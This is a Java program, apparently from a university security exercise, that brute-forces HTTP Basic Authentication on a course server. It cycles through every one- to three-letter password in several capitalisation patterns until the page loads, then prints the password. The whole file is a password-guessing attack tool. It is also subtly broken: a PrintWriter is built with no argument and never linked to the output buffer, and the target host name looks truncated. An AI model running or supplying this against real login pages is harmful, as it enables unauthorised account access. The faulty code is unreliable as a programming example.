import java.io.*;
import java.net.*;











public class BruteForce
{
   private String urlString = "http://sec-crack.cs.rmit.edu./SEC/2/index.php";
   private static String password;
   private static int length;          
   private static int t_counter;       
   private static int f_counter;       
                                       
   private static int cases;           
                                       
   private static int respCode;        

   public BruteForce()
   {
      Authenticator.setDefault(new BruteForceAuthenticator());
      t_counter = 0;
      f_counter = 0;
      cases = 0;
   }

   public static void main (String[] args)
   {
      BruteForce bf = new BruteForce();
      String file = " ";
      while(respCode != 200)
      {
         file = bf.fetchURL();
      }
      System.out.println("Number of attempts: " + t_counter);
      System.out.println("Password: " + password);
      System.out.println(file);
   }

   private String fetchURL()
   {
      StringWriter sw = new StringWriter();
      PrintWriter pw = new PrintWriter();

      try
      {
         URL url = new URL(urlString);
         HttpURLConnection huc = (HttpURLConnection)url.openConnection();
         respCode = huc.getResponseCode();
         InputStream content = huc.getInputStream();
         BufferedReader in = 
            new BufferedReader (new InputStreamReader (content));
         String line;
         while ((line = in.readLine()) != null) 
         {
            pw.println(line);
         }
      } catch (IOException e) {
         pw.println("Error  URL");
      }
      return sw.toString();
   }
            
   class BruteForceAuthenticator extends Authenticator 
   {
      private String username = "";

      protected PasswordAuthentication getPasswordAuthentication()
      {
         return new PasswordAuthentication(username,generatePassword());
      }

      protected char[] generatePassword()
      {
         int i,j,k;
         int n = 26;
         String letters1 = "qwertyuiopasdfghjklzxcvbnm";
         String letters2 = "abcdefghijklmnopqrstuvwxyz";
 
         i=0;
         j=0;
         k=0;
   
         
         
         if(t_counter == 0)
         {
            length = 1;
            cases = 0;
            f_counter = 0;
         }
         if(t_counter == 2*n)
         {
            length = 2;
            cases = 0;
            f_counter = 0;
         }
         if(t_counter == (2*n + 4*n*n))
         {
            length = 3;
            cases = 0;
            f_counter = 0;
         }

         char c[] = new char[length];

         
         
         if(length == 1)
         {
            if(f_counter == n)
            {
               cases++;
               f_counter = 0;
            }
            i = f_counter;

         } else if(length == 2) 
         {
            if(f_counter == n*n)
            {
               cases++;
               f_counter = 0;
            }
            i = f_counter/n;
            j = f_counter - i*n;

         } else if(length == 3) 
         {
            if(f_counter == n*n*n)
            {
               cases++;
               f_counter = 0;
            }
            i = f_counter/(n*n);
            j = (f_counter - i*n*n)/n;
            k = f_counter - i*n*n - j*n;
         }

         
         switch(cases)
         {
            case 0:
               c[0] = letters1.charAt(i);
               if(length > 1) c[1] = letters1.charAt(j);
               if(length > 2) c[2] = letters1.charAt(k);
               break;
            case 1:
               c[0] = Character.toUpperCase(letters1.charAt(i));
               if(length > 1) c[1] = Character.toUpperCase(letters1.charAt(j));
               if(length > 2) c[2] = Character.toUpperCase(letters1.charAt(k));
               break;
            case 2:
               c[0] = Character.toUpperCase(letters1.charAt(i));
               c[1] = letters1.charAt(j);
               if(length > 2) c[2] = letters1.charAt(k);
               break;
            case 3:
               c[0] = letters1.charAt(i);
               c[1] = Character.toUpperCase(letters1.charAt(j));
               if(length > 2) c[2] = letters1.charAt(k);
               break;
            case 4:
               c[0] = letters1.charAt(i);
               c[1] = letters1.charAt(j);
               c[2] = Character.toUpperCase(letters1.charAt(k));
               break;
            case 5:
               c[0] = Character.toUpperCase(letters1.charAt(i));
               c[1] = Character.toUpperCase(letters1.charAt(j));
               c[2] = letters1.charAt(k);
               break;
            case 6:
               c[0] = letters1.charAt(i);
               c[1] = Character.toUpperCase(letters1.charAt(j));
               c[2] = Character.toUpperCase(letters1.charAt(k));
               break;
            case 7:
               c[0] = Character.toUpperCase(letters1.charAt(i));
               c[1] = letters1.charAt(j);
               c[2] = Character.toUpperCase(letters1.charAt(k));
               break;
            default:
               break;
         }

         f_counter++;
         t_counter++;

         password = new String(c);
         return c;
      }
   }
}
